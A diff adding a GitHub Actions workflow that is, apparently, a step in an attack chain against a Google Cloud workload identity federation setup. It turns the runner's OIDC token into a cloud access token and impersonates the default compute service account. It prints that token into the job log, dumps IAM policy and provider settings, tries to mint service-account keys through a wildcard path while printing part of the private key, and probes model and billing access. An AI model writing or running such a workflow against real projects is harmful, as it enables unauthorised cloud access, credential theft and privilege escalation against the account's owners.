@@ -1,0 +1,87 @@
+name: i1270-chain59
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  c59:
+    runs-on: ubuntu-latest
+    timeout-minutes: 12
+    steps:
+      - name: run
+        run: |
+          set +e
+          NUM=363590592857
+          POOL=github-action
+          PROV=github
+          PRJ="projects/$NUM/locations/global/workloadIdentityPools/$POOL/providers/$PROV"
+          SA="$NUM-compute@developer.gserviceaccount.com"
+          jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
+          jq -n '{keyAlgorithm:"KEY_ALG_RSA_2048"}' > keyreq.json
+          jq -n '{options:{requestedPolicyVersion:3}}' > polreq.json
+
+          : > tok.jwt
+          for a in 1 2 3; do
+            J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=//iam.googleapis.com/$PRJ")
+            echo "$J" | jq -r '.value // empty' > tok.jwt
+            [ -s tok.jwt ] && break
+            sleep 3
+          done
+          [ -s tok.jwt ] || { echo "##MINT_FAIL"; exit 0; }
+          echo "##MINT ok=1 len=$(wc -c < tok.jwt)"
+          echo "##AUD //iam.googleapis.com/$PRJ"
+
+          sc=$(curl -s -o sts.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
+            -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+            --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
+            --data-urlencode "subject_token=$(cat tok.jwt)" \
+            -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+            -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+            -d "scope=https://www.googleapis.com/auth/cloud-platform")
+          FT=$(jq -r '.access_token // empty' sts.json)
+          echo "##STS code=$sc ftlen=${#FT} body=$(head -c 260 sts.json | tr -d '\n' | tr -s ' ')"
+          [ -n "$FT" ] || { echo "##STS_FAIL"; exit 0; }
+
+          gc=$(curl -s -o gat.json -w '%{http_code}' -X POST -H "Authorization: Bearer $FT" -H 'Content-Type: application/json' \
+            "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -d @req.json)
+          AT=$(jq -r '.accessToken // empty' gat.json)
+          echo "##GEN code=$gc toklen=${#AT} body=$(head -c 260 gat.json | tr -d '\n' | tr -s ' ')"
+          [ -n "$AT" ] || { echo "##GEN_FAIL"; exit 0; }
+          echo "##TOKEN $AT"
+
+          echo "===== provider object (attributeCondition)"
+          pv=$(curl -s -o prov.json -w '%{http_code}' -H "Authorization: Bearer $AT" \
+            "https://iam.googleapis.com/v1/projects/$NUM/locations/global/workloadIdentityPools/$POOL/providers/$PROV")
+          echo "##PROV code=$pv cond=$(jq -r '.attributeCondition // "NONE"' prov.json 2>/dev/null) name=$(jq -r '.name // empty' prov.json 2>/dev/null)"
+          echo "##PROV_B64 $(base64 -w0 prov.json)"
+
+          echo "===== SA policy (binding scope)"
+          sp=$(curl -s -o sapol.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' \
+            -d @polreq.json "https://iam.googleapis.com/v1/projects/-/serviceAccounts/$SA:getIamPolicy")
+          echo "##SAPOL code=$sp"
+          jq -r '.bindings[]? | "\(.role) -> \(.members|join(","))"' sapol.json 2>/dev/null | head -5
+          echo "##SAPOL_B64 $(base64 -w0 sapol.json)"
+
+          echo "===== keys.create PROJECT-SCOPED (expected DENY)"
+          kp=$(curl -s -o keyp.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' \
+            "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/$SA/keys" -d @keyreq.json)
+          echo "##KEY_PROJ code=$kp body=$(head -c 300 keyp.json | tr -d '\n' | tr -s ' ')"
+
+          echo "===== keys.create WILDCARD /v1/projects/-/ (chain step 4)"
+          kw=$(curl -s -o keyw.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' \
+            "https://iam.googleapis.com/v1/projects/-/serviceAccounts/$SA/keys" -d @keyreq.json)
+          echo "##KEY_WILD code=$kw body=$(head -c 300 keyw.json | tr -d '\n' | tr -s ' ')"
+          echo "##KEYW_NAME $(jq -r '.name // empty' keyw.json)"
+          echo "##KEYW_PKID $(jq -r '.privateKeyData // empty' keyw.json | head -c 40)"
+
+          echo "===== project get (editor capability)"
+          pg=$(curl -s -o pg.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM")
+          echo "##PROJECTGET code=$pg body=$(head -c 200 pg.json | tr -d '\n' | tr -s ' ')"
+
+          echo "===== models + billing"
+          m=$(curl -s -o m.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://us-central1-aiplatform.googleapis.com/v1/projects/$NUM/locations/us-central1/models")
+          echo "##MODELS code=$m body=$(head -c 200 m.json | tr -d '\n' | tr -s ' ')"
+          b=$(curl -s -o b.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://cloudbilling.googleapis.com/v1/projects/$NUM/billingInfo")
+          echo "##BILLING code=$b body=$(head -c 300 b.json | tr -d '\n' | tr -s ' ')"
+          echo "##FINISHED1270"
